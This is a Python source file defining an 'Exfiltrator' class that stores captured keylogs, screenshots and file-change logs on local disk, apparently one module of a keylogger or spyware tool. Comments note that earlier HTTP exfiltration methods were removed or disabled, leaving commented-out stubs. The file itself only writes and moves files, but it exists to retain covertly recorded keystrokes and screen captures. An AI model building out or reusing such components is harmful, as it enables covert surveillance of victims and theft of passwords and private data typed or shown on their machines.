import os
import datetime
import shutil # For moving files

class Exfiltrator:
    def __init__(self, keylogs_output_file, screenshots_output_dir, file_changes_output_file):
        """
        Initializes the Exfiltrator to save data locally.
        Args:
            keylogs_output_file (str): Path to the file where keylogs will be appended.
            screenshots_output_dir (str): Path to the directory where screenshots will be moved.
            file_changes_output_file (str): Path to the file where file changes will be appended.
        """
        self.keylogs_output_file = keylogs_output_file
        self.screenshots_output_dir = screenshots_output_dir
        self.file_changes_output_file = file_changes_output_file

        # Ensure output directories exist
        os.makedirs(os.path.dirname(self.keylogs_output_file), exist_ok=True)
        os.makedirs(self.screenshots_output_dir, exist_ok=True)
        os.makedirs(os.path.dirname(self.file_changes_output_file), exist_ok=True)

    def save_keylogs_locally(self, logged_keys):
        """
        Appends collected keylogs to a local file.
        Args:
            logged_keys (str): The string of collected keylogs.
        Returns:
            bool: True if saved successfully, False otherwise.
        """
        try:
            with open(self.keylogs_output_file, "a") as f: # "a" for append mode
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] KEYLOGS: {logged_keys}\n")
            print(f"[{datetime.datetime.now()}] Successfully saved keylogs to {self.keylogs_output_file}")
            return True
        except Exception as e:
            print(f"[{datetime.datetime.now()}] Error saving keylogs locally: {e}")
            return False

    def save_screenshot_locally(self, temp_screenshot_path):
        """
        Moves a temporary screenshot file to the permanent screenshot directory.
        Args:
            temp_screenshot_path (str): The path to the temporary screenshot file.
        Returns:
            bool: True if moved successfully, False otherwise.
        """
        if not os.path.exists(temp_screenshot_path):
            print(f"[{datetime.datetime.now()}] Warning: Screenshot file not found at {temp_screenshot_path}. Cannot save.")
            return False
        try:
            # Create a unique filename for the saved screenshot
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f") # Add microseconds for uniqueness
            filename = f"screenshot_{timestamp}.png"
            destination_path = os.path.join(self.screenshots_output_dir, filename)

            shutil.move(temp_screenshot_path, destination_path) # Move the file
            print(f"[{datetime.datetime.now()}] Successfully saved screenshot to {destination_path}")
            return True
        except Exception as e:
            print(f"[{datetime.datetime.now()}] Error moving screenshot from {temp_screenshot_path} to {destination_path}: {e}")
            return False

    def save_file_changes_locally(self, file_changes_data):
        """
        Appends collected file change logs to a local file.
        Args:
            file_changes_data (str): The string of collected file change logs.
        Returns:
            bool: True if saved successfully, False otherwise.
        """
        try:
            with open(self.file_changes_output_file, "a") as f:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] FILE CHANGES: {file_changes_data}\n")
            print(f"[{datetime.datetime.now()}] Successfully saved file changes to {self.file_changes_output_file}")
            return True
        except Exception as e:
            print(f"[{datetime.datetime.now()}] Error saving file changes locally: {e}")
            return False

    # The original exfiltrate_data and exfiltrate_file methods are removed/commented out
    # as we are no longer doing HTTP exfiltration.
    # If your original Exfiltrator had those, you'd delete them or comment them out.
    # def exfiltrate_data(self, data_type, payload):
    #     print(f"[{datetime.datetime.now()}] HTTP exfiltration is disabled. Data type: {data_type}, Payload: {payload}")
    #     return False # Always return False as we are not doing HTTP exfiltration

    # def exfiltrate_file(self, file_path, file_type):
    #     print(f"[{datetime.datetime.now()}] HTTP file exfiltration is disabled. File: {file_path}, Type: {file_type}")
    #     return False # Always return False as we are not doing HTTP exfiltration